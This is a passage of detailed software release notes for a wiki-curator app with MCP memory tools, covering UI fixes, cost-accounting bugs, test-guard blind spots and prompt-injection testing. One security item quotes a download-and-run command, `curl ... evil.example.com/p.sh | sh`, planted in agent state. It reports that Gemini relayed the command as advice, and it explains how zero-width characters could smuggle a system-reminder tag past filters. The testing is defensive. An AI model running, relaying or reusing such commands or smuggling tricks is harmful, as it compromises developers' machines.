It was the browser's default scrollbar on an `overflow-x` container nothing styled. **(3) EVERY NATIVE SELECT IS GONE.** The maintainer rejected the OS control outright: the closed chrome was already on-design but the OPEN menu is macOS-drawn and no CSS reaches it. A shared listbox replaces all of them, eight adoptions, keyboard parity proven with REAL trusted key events including type-ahead across 193 rows and PageUp/PageDown. The composer's old menu carried `role="listbox"` with **ZERO** keyboard support — a click-only menu wearing the role. **(4) ONE BUILD MODEL, AND NO NEW STORAGE TO EXPRESS IT.** `activeProvider` plus the pinned model already said it; a second key would need a migration, a precedence rule and a resolver branch. `resolveProviderDefault` and the four other model-producing functions are **byte-unchanged, proven** by extracting the baseline resolver and running both over 20 config shapes x 11 call shapes: **0 differences, with a positive control producing 220**. **(5) THE MODEL PIPELINE STOPS EXPLAINING MACHINERY.** Settings is organised by JOB — building the wiki versus answering questions — because every confusing artefact followed from that split being invisible. Vocabulary six to three. The `chat only` badge was deleted: true on **194 of 213 rows**, and a flag on 91% of a list carries no information. The chat list defaults to a working set with all 213 one click away; **nothing is hidden, only not-first**. New: re-ask the same question with a different model, and because prompts are built from the last 20 messages the dialog states it is a second opinion rather than an independent run — and states it CONDITIONALLY, because for an older answer that claim was **false on a spending surface**. **(6) THE CATALOGUE WAS SILENTLY PARTIAL.** Chat offered only the 5 static OpenRouter ids until a manual Settings button was pressed, with no signal anywhere — the direct cause of "the models sometimes show and sometimes do not". Now synced when absent or 24h stale, fired inside `listen()` rather than at module scope, because an offline suite imports that router unisolated and module-scope firing would have made a TEST hit the network and write into the real user-data dir. **(7) THE SUITES COULD NOT CATCH A REGRESSION, AND THE PROOF IS THE MEASUREMENT.** Six adversarial audits by agents that wrote none of it. Capability: **NO user-facing loss**, verified by running both builds side by side on two ports against the same seeded data with real conversation JSON byte-identical 7 of 7. XSS: **clean** under 21 hostile payloads planted in the catalogue sidecar, detector validated on a control that DID fire. But five real defects applied to production SIMULTANEOUSLY left one suite at **1982 passed, 0 failed, exit 0, identical to baseline** — swapped measurement chip labels, swapped sort labels, an inline two-decimal money formatter rendering every sub-cent price as `$0.00`, and three deleted toggle listeners. Four root causes, fixed centrally in a new shared helper with a positive control per cause: a positive source scan a `//` comment satisfies; a file-wide regex satisfied by a line in a DIFFERENT function; a function executed but its CALL SITE never asserted; and an expected value read from the same constant the code reads. **The helper then reproduced root cause 4 INSIDE the fix for root cause 4** — the suites disagree about `ok()`'s argument order, so a reversed signature made every literal assertion pass unconditionally; caught by mutation, not review, and now carries a control proving the hazard. **(8) END-TO-END WITH PRODUCTION KEYS FOUND WHAT NO OFFLINE SUITE COULD.** Four scenarios, about $0.11. **THE INGEST BUDGET CAP NEVER FIRED**: `chargeForItem` applied Anthropic's 0.1x cached-read discount to every provider, so a $0.15 cap over 5 Gemini items ran all five and reported `spentUsd 0.05`. Measured by driving the real worker loop, not the arithmetic. The same formula in chat under-reported by up to **2.17x**, verified against real credit-balance deltas with a cold-cache control matching actual spend **exactly to eight decimal places**. Both fixed; anything unresolvable now charges FULL price, because on a spending surface the honest error direction is to over-state. The equality suite was deliberately NOT collapsed to plain equality: two copies wrong the same way satisfy it, which is exactly the state this pair was in. **EVERY PROVIDER'S ERRORS SENT THE USER TO GOOGLE** — the message interpolated the right NAME and hardcoded Google's figures, pricing link and status page; v3.0.4 made the name dynamic and left the rest, so it read as fixed for fifteen releases. Now per-provider with every remedy link verified live, no figures invented, and an unknown provider degrading to no URL rather than a default vendor. **A 409 REFUSAL ON A SPENDING SURFACE RENDERED OFF-SCREEN** at y = -135, -436 and -678 across three rows, with focus dropped to `body`; the ARIA was already correct, so screen-reader users were served and sighted users were not. Fixed structurally first — the alert renders INSIDE the clicked row — because a scroll that has to fire correctly is a weaker guarantee than a message that cannot be elsewhere. **400 MB PER HOUR OF DISK READS, PER OPEN TAB, FOREVER**: the setup-guide overlay polls two endpoints every 5 s, is body-appended so it survives every view change, and its all-done stop lived inside a flag Settings sets FALSE — so a flag about whether a completed panel should VANISH decided whether the app keeps hitting disk. Per poll: 18 reads and 597.9 KB including six `log.md` files read IN FULL to extract one date. Now 6 reads, 16.3 KB, and **0 polls in 58 s** on a completed install. The log read was made RARE rather than cheaper, because a tail read would have silently surrendered the v3.0.1-beta.10 guarantee. **THE PROGRESS INDICATOR CONTRADICTED ITSELF THREE WAYS** — a counter reading 2/5, a ring reporting 40% and text reading `stage 3 of 5 · 15%`, on screen together, one percentage on three scales. **(9) HARNESS-, AGENT- AND LLM-AGNOSTIC, IN THE FILESYSTEM TOO.** `claude-skills/` is now `skills/` — the old name asserted a Claude-only framework. Moved with `git mv`; all four files byte-identical, so **no re-upload is needed**. There is NO neutral copy of either playbook: a build script derives one on demand and nothing generated is committed, so there is no second copy to drift. Per-host loading is primary-source verified with **three DIFFERENT MCP tool-naming schemes** found across hosts, Cursor's marked unverified rather than guessed, and **Aider recorded as having no MCP client at all** despite being listed elsewhere as supporting the convention. Documentation gained **18 Mermaid diagrams and 1,568 table rows**, seven false claims corrected — including one that explains the original report directly, *"There is no automatic refresh, on purpose"* — and 558 links checked, 0 broken. **VERIFICATION: 97 -> 100 offline suites, all green.** Memory-view assertions 251 -> 353 and the five-at-once scenario now reports 25 failures; settings 134 -> 166; picker 1982 -> 1932 having removed 111 redundant assertions and added 61 that bite. | `v3.17.3` | **The release the maintainer's own first hour of real use produced — two UI defects he found, and a documentation sweep that discovered a wrong cost claim and a skill re-silencing a fix from two releases earlier.** **(1) THE AGENT-MEMORY SIDEBAR SHOWED STALE DATA, ON THE ONE SCREEN WHOSE PREMISE IS THAT SOMETHING ELSE WRITES WHILE YOU WATCH.** Reported as *1 scope, 12 hr ago* beside a dropdown listing TWO scopes, one saved six minutes earlier. **Not a counting bug** — the route was already answering `scopeCount: 2, ageSeconds: 350`. `loadIndex` had exactly ONE call site, in `onEnter`, and the file contained zero timers, so an agent saving over MCP changed the data underneath a view with no way to notice, leaving two panes of one screen disagreeing on screen simultaneously. Fixed with three triggers — revalidate on scope select (riding the fetch the click already causes), on `focus`/`visibilitychange`, and an ADAPTIVE poll whose delay is `clamp(20s, lastRefreshMs x 20, 5min)` because the route reads a 16 KB journal tail per pair per domain across up to 200 domains. A `screenSignature()` no-op guard means a poll that finds nothing new does not re-render: measured, two DOM probes survived an unchanged poll, so an open fold is never disturbed. The document is never swapped under a reader — a stale write offers a `Reload` that KEEPS the user's scope rather than snapping to newest. Teardown verified at **0 fetches in 28 s** away. **(2) THE PICKERS WERE PARTLY NATIVE, AND THE ORCHESTRATOR'S MECHANISM WAS PARTLY WRONG.** `appearance` was absent, but the claim that macOS drew the whole control was an overstatement: Chromium honoured the author's background, border and radius. Genuinely native were the indicator glyph and the OPEN popup. The closed control now matches the app with a CSS-drawn chevron (two rotated borders following `--text-2`, not a data URI, which carries its own colour and cannot follow the theme). **What is still native is stated rather than implied away: the open dropdown list is OS-drawn and CSS cannot reach it.** A third option was found and deliberately NOT taken — `CSS.supports('appearance','base-select')` is true on this Chromium and `::picker(select)` parses, which would style the open menu while keeping native keyboard and AT behaviour, but it is Chromium-only and the fallback is untested. **A REAL INCONSISTENCY WAS CREATED AND IS RECORDED:** `appearance` appears **zero times in the entire `/next` CSS tree**, so all four selects were native-chrome and memory's are now the only styled ones. The same four lines would port to the other three files. **(3) A WRONG COST CLAIM ON A SPENDING SURFACE.** `docs/user-guide.md` said of the model list *"none of them is dearer than anything above"*. False: `kimi-k2-0905` bills $0.60/$2.50 against a $0.10/$0.40 floor. Beside it, *"seventeen hand-measured models... three OpenRouter"* appeared six times across two docs where `OFFERABLE_MODELS` is 7/7/**5** = 19. **(4) A SKILL RE-SILENCING A FIX FROM TWO RELEASES EARLIER.** `curator-continuity/SKILL.md` documented `notes_meaning` as *three* branches when there are FOUR, and classified the machine-identity warning as normalisation that *needs no action* — that warning is precisely what v3.17.1 added after finding the install-id fallback silently returned users to the layout that caused a measured data loss. The skill also described sync as discard-only (the SPLICE is the worse half, corrected in v3.17.2 everywhere but here), omitted the tier-1 `project.md` exception, and carried no decisions-versus-traps placement rule despite v3.17.1 measuring that placement is load-bearing. And `my-curator/examples.md` still sent users to the **Sync tab**: v3.17.2's eight-site fix landed in `SKILL.md` and never reached its sibling file. **(5) THE DOCUMENTATION A REAL USER ACTUALLY NEEDED WAS ABSENT.** Three questions the maintainer had to ask a session to answer are now in `user-guide.md` §13b: **one standing brief per PROJECT, not per scope** (`project.md` sits at the state root with no scope segment and is returned on every read — he was about to collapse every workstream into one scope to get a shared brief he already had, which would have cost him the ability to run two threads); **how to turn it off** (there is no setting, because nothing saves unless an agent calls the tool); and **domain versus workstream**. **The orchestrator's `readonly: true` framing was significantly understated and is corrected:** it does not block four MCP tools, it blocks ingest (route AND batch queue), compile, EIGHT mutating Health endpoints, the MCP write tools and `save_working_state`, and drops the domain from the Ingest picker in both frontends. It means *this domain is now an archive*, not *memory off*. Same question, same models, WITH the state: **0 of 4 did either.** The finding is not that answers got more detailed — **the state INVERTS the top recommendation**, which is the only result that justifies a store, a sync path and a skill. Reported with its method and its N, never as a bare digit, because n=4 per arm is a demonstration of mechanism and not a rate. **(2) THE RESEARCH PROPOSAL'S NAMED BLOCKER WAS THE WRONG CULPRIT.** It said `compile_to_wiki`'s content-hash-per-day slug would turn 40 state updates into 40 pages. Arithmetically true, and irrelevant: a memory tool never touches `compile.js`. The real wall is one level down and was proven by execution — **`sessions/projA/main/state.md` and `sessions/projB/feature-x/state.md` BOTH land on `entities/state.md`**, the second silently overwriting the first, because `normalizePath` redirects every non-canonical folder and FLATTENS to the basename. Dotfolders fail identically. `(project, scope)` is inexpressible through `writePage`. **And the primitive the design needed already existed:** `opts.replace: true`, shipped in v3.0.3 so Shared Brain mirror pulls could make revoked facts disappear. Verified: default merge RESURRECTS a section the new state DROPS — a resolved `## Blocked On` reappears under `Current State: v2 unblocked` — while `replace` correctly drops it. **(3) STATE SUPERSEDES; KNOWLEDGE ACCUMULATES.** The wiki's additive merge is right for knowledge and wrong for state, so state is a SEPARATE store: `domains/<project>/state/project.md` (standing brief, human-authored, returned on every read) + `<scope>/<machine>/current.md` (OVERWRITTEN each save) + `journal.jsonl` (append-only). Two MCP tools, 18 -> **20**; a read-only in-app Memory view over a read-only `GET /api/memory` route; and a `curator-continuity` skill carrying the capture discipline. **(4) THE HARDEST QUESTION DISSOLVED RATHER THAN BEING ANSWERED.** The brief called it central: what does consolidation do to a FAILED-ATTEMPT record, which the source manual calls the single highest-value part of a handoff? Measured against the real corpus: `HANDOFF.md`'s failure appendix is **23 KB, 23% of 98 KB across three files, 25 named incidents, 100% authored**, and its value is the PATTERN across them ("#11 is the third layer of the same shape"). Append-only, compounding, worth being in the graph — those are the WIKI's semantics. **Failed attempts are never destroyed by consolidation because they were never state.** v1 therefore needs no consolidation at all. **(5) A LIVE P0, UNRELATED TO THE FEATURE.** MCP reads honoured `--domains-path` while WRITES resolved `getDomainsDir()`, which had **no CLI rung at all** — so `compile_to_wiki` returned `ok:true` with a `summary_path`, wrote the page into the CONFIG tree, put `.mcp-write-log.jsonl` in a THIRD tree, and a follow-up `get_node` on the returned path reported NOT FOUND. Fixed with a new PRODUCTION `setCliDomainsDir()` — deliberately NOT the existing `__setDomainsDirOverride` test seam, which `test-paths.js` asserts production never sets. **Why it shipped is the better finding:** `test-paths.js` §9 has four cases; three carry a "config.js agrees" companion assertion and **case (d) — the CLI-arg case, the only one where they disagreed — has the adapter half and no companion.** Three-quarters of a symmetry. Restoring the bug leaves that suite **137/0 GREEN**. **(6) A BLOCKER THIS RELEASE CREATED, CAUGHT BY ITS OWN ADVERSARIAL AUDIT.** A tool-count copy edit put an unescaped apostrophe inside a single-quoted string in `src/public/next/views/settings.js` — `saving an agent's working state`. **The file stopped being JavaScript.** `next/app.js` imports it STATICALLY, so the module graph never evaluates, `window.__curatorBooted` is never set, and the v3.0.15 boot guard paints the recovery panel: a **blank app for every user on the next auto-update**, no staging, no rollback. **`npm test` was 87/87 GREEN over it.** EIGHT suites — model-picker 1542, loading-gate 219, openrouter-qualify 197, onboarding 195, mcp-wizard 182, provider-rows 162, confirm-dialog 155, model-fallback 82, **~2,700 assertions** — read that file as TEXT via brace-matched extraction and **none ever asks Node whether the bytes still parse.** New `test-frontend-syntax.js` (29 assertions) runs `node --check` over every `.js` under `src/public/**`, ENUMERATED FROM DISK (a hardcoded list is how the last guard went blind), with a POSITIVE CONTROL proving the detector fires; reinstating the exact bug reds 2. This is the THIRD whole-class blind spot shipped in a frontend guard. **(7) THREE DATA-LOSS PATHS IN THE STORE, ALL FOUND BY TESTING, ALL FIXED.** **(a)** Past `MAX_INDEX_ENTRIES = 60` pairs, `readWorkingState` filtered the TRUNCATED index, so a named scope beyond the cap returned *"No state saved under scope X"* — a confident false statement — **with the file intact on disk. The agent then starts cold and its next save OVERWRITES the handoff it was told did not exist.** Fixed by resolving a NAMED scope from its own directory; the cap belongs to the index, not to a targeted lookup. **(b) TWO MACHINES SHARING A HOSTNAME DESTROYED EACH OTHER'S HANDOFF** — default macOS names collide (two `MacBook-Pro.local`), and on a shared path `git pull --no-rebase -X theirs` prints `Auto-merging`, reports success, and **silently discards one side**, clobbering the append-only journal with it: three hours of a session, gone, no error. Fixed with a per-installation identity — folder `<hostname-slug>-<install-id>`, the id persisted OUTSIDE the synced tree in `.curator-install-id`; legacy single-hostname folders stay readable and only the NEXT save moves, so nobody loses history to the fix. A fallback is reported (`installIdAvailable: false`) rather than being silent. **(c) A near-empty save overwriting a substantial handoff — and this ACTUALLY HAPPENED**, to a tester, on a FIRST run with a live model: **145 bytes over 3,598, 4.0%**. Now refused by a two-armed guard (`MIN_PROTECTED_BODY_BYTES = 1024`, `REPLACE_RATIO = 0.05`) with `replace: true` as the DELIBERATE override — the refusal costs one retry; the document it would have replaced is not recoverable. **(8) SECURITY, MEASURED RATHER THAN THEORISED — and the reader we had to defend is not the model.** Planted state containing `curl -s https://evil.example.com/p.sh \| sh` was **never OBEYED (0/20 live runs)**. It was **RELAYED: in 3 of 10 runs Gemini reproduced it to the developer as a recommended next step, with no warning.** Escaping the protocol tags stopped it parsing as a tool call; the prose and the URL walked straight through and were laundered into advice by the assistant the developer trusts. Now DEFANGED for display on both write AND read (`https[:]//x/y`, `&#124;`) — the threat-intel convention, because a human reads through it while a terminal and an auto-linker do not — never deleted or mangled, since a legitimate handoff routinely carries URLs and commands. Control, bidi and zero-width characters are stripped BEFORE the tag patterns so a ZWSP cannot smuggle `<sys[ZWSP]tem-reminder>` past them. **ZWJ and ZWNJ are DELIBERATELY excluded** — ZWJ is load-bearing in emoji, ZWNJ is required orthography in Persian and several Indic scripts — so a ZWNJ mid-keyword still evades: **narrowed, not closed, and stated rather than implied away**, with a positive corpus (CJK, Korean, Cyrillic, Arabic, Hebrew, emoji, Persian) asserted byte-identical. **(9) GUARDS THAT COULD NOT FAIL, FOUND IN THIS RELEASE'S OWN WORK.** Deleting read-side sanitisation of `project.md` left **all 209 assertions green** — `current.md` had a positive case AND a fixed-point case, the brief had only the fixed-point case, which a DELETED call satisfies trivially. Fixing it surfaced worse: `neutraliseProtocol` was the read path's ONLY filter and **never stripped control characters at all**, because both write paths strip C0 *before* calling it, so the read inherited nothing — a synced or hand-edited `current.md` carrying a NUL or ANSI escape reached the caller verbatim. Also: an assertion pinning the ABSENCE of a word the code no longer emits (green forever, proving nothing), and a mutation harness whose anchor **did not match**, so its result was trusted without the mutation ever applying — the shape this repo has now hit in four consecutive releases, which is why every mutation here was read back off disk before its result counted. And **`.curator-install-id` was NOT gitignored: the FIFTH instance of that class** (`.write-lock` v3.0.15, `.DS_Store` v3.0.16, the ingest queue v3.3.0, the OpenRouter sidecars v3.16.1) — closed with the reasoning written into `.gitignore` itself, and it matters more here than in the four before it, because committing a per-install identity would make two clones resolve to the SAME state path and re-create finding 7b. **(10) SEAMS BETWEEN PARALLEL AGENTS — each half right in isolation, which is why they are worth recording.** Store, tool layer, UI and docs were built concurrently. `scopeCount` counted (scope, machine) PAIRS, so the UI told a user with two work-streams on two machines that they had *"3 scopes"* — now DISTINCT scopes, with copies reported separately. `observedAt` was the only camelCase key in an otherwise snake_case argument schema, so a caller following the surrounding convention and sending `observed_at` had it silently ignored and **the save time stamped over the real observation time** — the exact field whose whole value is pinning a BEFORE; normalised inward at the tool boundary. `replace` was documented in the store and honoured by it, and **never forwarded by the MCP layer** — documented-and-unwired, this repo's v3.16.0 shape. And two agents verified journal limits against different layers and reached OPPOSITE answers (default 8 / cap 20 for MCP; default 10 / cap 50 for the in-app route): **both were correct, per surface**, and the divergence is deliberate — an MCP response is charged against a model's context window and a browser response is not. **(11) THE SCHEMA CAME FROM THE MAINTAINER'S OWN CORPUS, not the proposal.** Real handoffs carry NEGATIVE constraints ("firm decisions — do not re-litigate") for which the four-section research template has no slot, and the useful axis is not derivable-vs-authored (measured: **2-3% derivable, 87-90% authored** — that split automates 3% of the mass) but **CURRENT vs OBSERVED-AT-A-MOMENT**: "84 suites green before my change" is derivable at write time and its whole value is pinning a BEFORE that re-derivation destroys. So observations carry a timestamp and the command that re-checks them. **Decay measured across his three real handoffs: today's 0/4 verifiable facts wrong; one release old ~4/10 — including THREE of its nine "KNOWN AND UNFIXED" items already fixed in the very next release; eleven releases old ~3/4 wrong with its headline next-action already done.** **(12) CAPTURE IS SKILL-INSTRUCTED, NOT HOOKS, AND THE HONESTY IS THE POINT.** Zero hooks are configured anywhere on this machine, so the proposal's `SessionEnd` path is entirely unbuilt; a skill works in every MCP host while hooks must be rebuilt per harness. Saving OVERWRITES and is therefore idempotent, so the instruction is **save early and often**, not once at the end — which removes the single point of failure rather than pretending a degraded model near its limit will remember. **The skill agent caught the corollary I had missed: every save must be COMPLETE, not a delta**, or the third save silently drops the firm decisions recorded in the first. Scope is CALLER-SUPPLIED, never inferred — measured: **3 of the 4 git worktrees on this machine are DETACHED HEAD**, so `git branch --show-current` returns EMPTY for 75% of them; and a scope-less read returns an INDEX, without which a fresh session in another harness must guess a slug it has never seen. **(13) DEAD DATA AND STALE CLAIMS, including in MODEL-READ surfaces.** The store computed `machineCount`/`machinesTruncated` and the MCP layer copied neither, so per-scope truncation was invisible to the model (verified live after the fix). A hand-listed `MUTATORS` array in `test-mcp-e2e.js` exercised 4 of 5 mutators — **and its `compile_to_wiki` entry passed a misspelled argument, which the suite never noticed because the read-only refusal fires BEFORE argument validation**; the docs agent DELIBERATELY left its "four mutating tools" comments alone because they accurately described what the test did, refusing to claim coverage that did not exist, and the gap was closed instead. That new assertion was then **measured to be weaker than it looks and the limit RECORDED**: removing the MCP-layer `refuseIfReadonly` entirely leaves it green, because the store refuses mirrors too. `claude-skills/my-curator/SKILL.md` named four mutators when there are five and **omitted both new tools from `allowed-tools` entirely — they were uninvokable by that skill**; `mcp-wizard.js` carried a comment saying "18 tools, of which 4 mutate" **three lines above `TOOL_TOTAL = 20`**; `architecture.md` had asserted the `--domains-path` fix **since v3.1.1**, a release and a half before it existed, in prose fifteen lines below a numbered list headed "verified in source" that correctly showed no CLI rung. Two false "full memory" claims corrected — `README.md`, and a worse one in `user-guide.md` promising "full memory of past conversations" when chat never reads another conversation at all. **The frozen `/old` `index.html` was deliberately edited** (tool count only) because the wizard suite pins that number against the real table and CLAUDE.md records it has already been stale twice; `app.js`, `styles.css` and `markdown.js` are byte-identical. **Verification: 84 -> 89 offline suites, all green**; working-state **451**, the in-app memory view **184**, MCP tools **163**, MCP e2e 107, path fix 49, frontend syntax 29; every headline guard mutation-proven RED for a BEHAVIOURAL reason with `shasum`-verified restores and each mutation read back off disk before its result was trusted; live end-to-end over real stdio JSON-RPC (save then read carries headline, decisions, traps, recheck command and next steps; stdout pure, **0 stderr bytes**); real `.curator-config.json` sha256-verified unchanged (never mtime); `domains/` 5,412 files unchanged with **zero `state/` dirs created**; secret scan 0 hits with a positive control. **KNOWN AND DELIBERATE:** the standing brief is human-authored and read-only from MCP — there is no brief-writing tool, matching the practice being automated, where the handoff is the part that costs time; a scope beyond the 60-entry index is reachable BY NAME but absent from the scope-less listing, which reports `truncated`; the server dispatches pipelined JSON-RPC requests CONCURRENTLY and completes OUT OF ORDER, so a client that does not await a save before reading can observe stale state — not reachable through a normal MCP client, measured rather than assumed; **capture is skill-instructed and therefore ADVISORY** — nothing forces a save, and a missed one yields the PREVIOUS state, never a corrupted one, which is the fail-safe direction and the reason no enforcement was added; the shared markdown renderer emits headings as `<div>`, so the handoff has no screen-reader outline (pre-existing, affecting only the users who cannot route around it); and `mcp/tools/compile.js` carries a dead `generateText` import. |
| `v3.16.1` | **The measurements were all correct and none of them reached the user at the moment they were needed.** Two live reports, one root cause. **(1) 47,603 CHARACTERS OF PROSE IN A DROPDOWN.** Each model rendered its full measured `note` inline — ~200 words per row, in a menu. Measured on a real 192-model list: **47,603 chars -> 1,011, a 98% reduction.** The cause is worth recording: **every FETCHED catalogue entry is 'flagged' by construction** (199 of 206), because none has been measured against the ingest prompt — so the flag text rendered on essentially every row. Fixed with ONE shared builder (`shared/model-summary.js`) emitting a derived line from STRUCTURED fields — never new prose, so the short text and the long text CANNOT drift apart, which two hand-maintained descriptions of one fact always eventually do. Clauses are omitted when their field is absent; `cautionReason` is a NEW REQUIRED field for any `caution`/`dominated` entry and **always survives the collapse**, because a warning behind a click is not a warning. The full note is neither deleted nor truncated — truncating a measured claim mid-sentence can invert it. Settings and the composer are deliberately DIFFERENT densities and the same in vocabulary; that asymmetry is documented so nobody 'fixes' it. **(2) A MODEL REPORTED AS BROKEN THAT WAS MERELY SLOW.** The maintainer picked `deepseek/deepseek-v4-flash-0731` and watched a bare spinner for minutes. Verified from the stored record: it answered, `provider: openrouter`, `model: deepseek/deepseek-v4-flash-0731`, 16,135 in / 2,039 out, correctly attributed. **We had measured its speed and never told him.** Chat now carries the elapsed clock ingest got in v3.0.17 after the identical complaint, and past 20 s — chosen because the fastest measured model answers in 13–22 s, so it cannot fire normally — states that model's measured call time once, plainly, no animation. **A model we have NOT measured gets the clock and NO claim at all**: we have latency for ~14 of ~190, and inventing an expectation is worse than silence. **(3) SEARCH, SORT AND A MEASURED-ONLY FILTER**, appearing only past 12 rows. A model missing a sort key is **not fabricated a value** — it keeps its delivered order, trails as a block, and the count states how many lack one; our five hand-measured entries are exactly that block, because they are typed in rather than fetched. **NO 'MOST CAPABLE' SORT, and the refusal is evidence-based:** we have capability data for ~14 of ~190, and this week's own data contradicts every available proxy — `z-ai/glm-4.7` passes every metadata filter, is FAST (38 s), and returned **0 usable outlines in 9 runs**, while `minimax/minimax-m3` failed 9/9 as its own FREE sibling passed 8/9. Price, size, recency and vendor all pointed the wrong way. **(4) A NUMBER THIS PROJECT HAD ALREADY PROPAGATED THREE TIMES WAS FALSE.** A `llm.js` docblock stated deepseek 'took 491 SECONDS' — **no run ever did.** 491 was the MEAN of one 382 s completion and a 600 s TIMEOUT. The orchestrator repeated it to the maintainer three times before an agent caught it. A mean contaminated by a timeout is not a measurement. **(5) AN EIGHTH GUARD THAT COULD NOT FAIL, found by an agent in its OWN work:** `filterHtml` was computed and never rendered, and every assertion passed because they drove the pure core instead of the real render. Closed by driving `renderModelPicker` and splitting its real output. **(6) A RUNTIME ARTEFACT ONE `git add -A` FROM BEING COMMITTED.** `.openrouter-catalogue.json` — the persisted synced catalogue — sat untracked and NOT gitignored in the repo root beside `.curator-config.json`, escaping v3.16.0 only because it did not yet exist at commit time. **This repo has now shipped that class four times** (`.write-lock` v3.0.15, `.DS_Store` v3.0.16, the ingest queue v3.3.0), each time because a new runtime file appeared next to tracked source and nothing excluded it. Closed for it and for the qualification records, with the reasoning written into `.gitignore` itself. **Verification: 84 offline suites green**; assertions **3,286 -> 3,776** (chat-model 1472, picker 1542, composer 856, model-layer 732); 17 mutations RED for behavioural reasons with `shasum`-verified restores, including one that first came back green and was chased rather than filed; verified in a real browser at 192 models in both themes. **CORRECTED IN DOCS, pre-existing:** the composer's badge word was documented as `dominated` in two places when both surfaces have rendered `out-performed` since v3.13.1, and `architecture.md` claimed both surfaces render the note verbatim, which the composer no longer does. **A docs agent also REFUSED to publish a statistic the orchestrator supplied** — a parameter-count figure it could not find anywhere in the code — rather than print an unverifiable number. **KNOWN AND UNFIXED:** at a 375px viewport the whole shell collapses (`.model-list` resolves to 0px), pre-existing and in untouched code. |
| `v3.16.0` | **The model list stops being a hand-typed three and becomes the catalogue, filtered — and the user can promote one into the build lane by measuring it on their OWN wiki.** The maintainer's ask: people who want to avoid the closed labs, and people who want to build a second brain with capable open-weight models — Qwen, DeepSeek, Kimi, GLM — must be able to. Cost may exceed Gemini's; that is the USER'S choice, so **price is a displayed FACT and never a quality gate** (a mutation ADDING a price ceiling reds 13). **(1) THE PIPELINE EXISTED AND HAD ZERO CALLERS.** `fetchOpenRouterCatalogue`, `openRouterRecordToSpec` and `setOpenRouterCatalogue` were all built, tested and documented in v3.15.0 and invoked from **nowhere in production** — verified with Python after a `grep` in this session returned nothing for a pattern Python found 11 times. That is why a public README once promised *"hundreds of models"* nothing populated. Wired: `POST /api/config/openrouter/sync`, live-measured at **HTTP 200 in 123 ms**, `387 total -> 193 eligible -> 189 admitted`, picker **3 -> 192**. Persisted to a SIDECAR file, never `.curator-config.json` — an 80 KB catalogue must not share the blast radius of a 538-byte credential file — and **re-admitted at boot THROUGH THE SAME FILTER**, so a model since made ineligible is dropped rather than grandfathered (proven live: a hand-planted `suitability:"general"` entry was refused BY NAME at boot). A failed or empty fetch **leaves the previous catalogue intact** (M5 reds 18) — clearing it would read to a user as *no models available*, which is a lie. **(2) THE FILTER, AND THREE DEFECTS IN THE OLD ONE.** The moving-alias guard keyed only on the `~` prefix and missed `openai/gpt-chat-latest`, the sole `-latest` id without one. The output-ceiling check read `context_length` as a stand-in for `max_completion_tokens` — **false in 374 of 374 cases**, and would have falsely admitted 59 models. Tiering was never evaluated at the app's REAL ~85k-token prompt, where `qwen/qwen3.7-flash` headlines $0.03/$0.13 and actually bills **$0.10/$0.40**. **And a fourth found by an agent correcting me:** I applied *"do not read the optimistic field"* to the ceiling and then contradicted it for context. Both model-level fields are provider SUMMARIES and NEITHER is a floor; reading the optimistic one admitted 9 models whose own top provider is below the bar, worst case **1,024,000 vs 32,768**. **THE 200,000 CONTEXT FLOOR IS A PARITY RULE, NOT A ROUND NUMBER:** `anthropic/claude-haiku-4.5` has exactly 200,000 and this app ships it as a default, so we do not offer an OpenRouter model worse on context than one we already ship. It costs us `ibm-granite/granite-4.0-h-micro` (131,000) from the synced list. **(3) A FACT AND ITS ABSENCE, ONE LEVEL DOWN, INSIDE THE ANALYSIS OF ITSELF.** v3.15.0 said `nex-agi/nex-n2-mini` *"advertises reasoning as OPTIONAL"*, implying the metadata lied. **It did not.** That model (3 of 3 unparseable, entire 24,576-token budget on hidden reasoning) and `upstage/solar-pro4` (**9 of 9 clean**) carry **BYTE-IDENTICAL** reasoning metadata — `{"mandatory": false}` with `default_enabled` **ABSENT on both**, not false. **74 of 380 models share that shape**, so it means UNMEASURED, never BROKEN, and must never be a rejection signal (M9 reds 11). Corrected in `llm.js` and in `docs/model-lifecycle.md`, which carried the identical claim verbatim. Sibling absence traps found and pinned: an absent `utc_days` in a price override means ALL days, not none (M15 reds 4); a malformed date must not read as absent; and a typo in the `contextField` option name silently selected the OPTIMISTIC field rather than erroring. **(4) ON-WIKI QUALIFICATION — and the previous rejection was reasoned about a case this is not.** `docs/model-lifecycle.md` rejected on-demand qualification on three legs. Two hold: metadata cannot predict whether the JSON PARSES, and `suitability`/`note` are COMPARATIVE judgements a machine must not write. The third — *a fresh install cannot build a realistic probe prompt* — is **TRUE for a fresh install and FALSE for the user who wants this**, who by definition already has a wiki: ~99% of the real prompt is the user's own material and the fixed scaffold is **3,503 chars**. So the probe runs against THEIR index. Promotion is a **THIRD LANE STATE** read as a SEPARATE DISJUNCT in `isBuildLaneModel`, never by widening `suitability !== 'chat-only'` — widening it would breach the two layers that stop a fetched entry reaching the build lane, and would badge a user-probed model IDENTICALLY to a hand-measured one, collapsing *"we measured this across many documents"* into *"you ran nine last Tuesday"*. **The agent that built it first REFUSED to build it**, proving by execution that promotion was inexpressible from the files it owned: the pin stored as `kimi-k3` while `getProviderInfo` still returned `solar-pro4` — the `M3b` shape, a user told one model and served another, with the wrong price. It also corrected the brief: **TIME, not cost, is the binding constraint** (~8 min on the fastest model, **43** and **57** on the slowest, against $0.08–$0.38), so the confirm leads with duration and the run is cancellable; and the probe must NOT hold the write lock, since holding it for an hour would block Refresh, Sync and Update. **(5) THE MEASUREMENT — 9 candidates, 9 runs each against the REAL 343,716-char outline prompt, $0.97, and TWO OF NINE WERE CATASTROPHICALLY BROKEN.** `z-ai/glm-4.7`: **0 raw, 9 unrepairable** — and it passes every structural filter and is FAST (38 s). `minimax/minimax-m3`: **0 raw, 9 unrepairable** — while its FREE sibling `minimax/minimax-m3:free`, already shipped, measured 8/9 in v3.15.0. **Same base model; the PAID route is the broken one. Model identity does not determine reliability — routing does.** `deepseek/deepseek-v4-flash-0731` produced clean JSON at **~382 s per single outline call** and its second run did not finish at all; `z-ai/glm-5.2:free` was rate-limited to nothing and is recorded `NOT_MEASURED` — never a defect and never a pass. **(6) THREE MODELS THAT MEASURED CLEAN WERE REFUSED ANYWAY, ON PRICE HONESTY** — a stricter standard than the brief asked for, and the right one. A COLD run's `usage.cost` reveals which endpoint actually BILLS: `qwen/qwen3-235b-a22b-2507` billed Parasail's $0.14/$0.80, **1.64x the $0.0875 we would have quoted**; `moonshotai/kimi-k2.6` spans **$0.5372–$1.0900 across 19 endpoints (2.03x)** with no quotable number; and `qwen/qwen3-30b-a3b-instruct-2507` is served at **128,000 context by the endpoint that bills it**, so its cheap price and its big window are NOT CO-AVAILABLE. Quoting a price the serving endpoint does not charge is a false 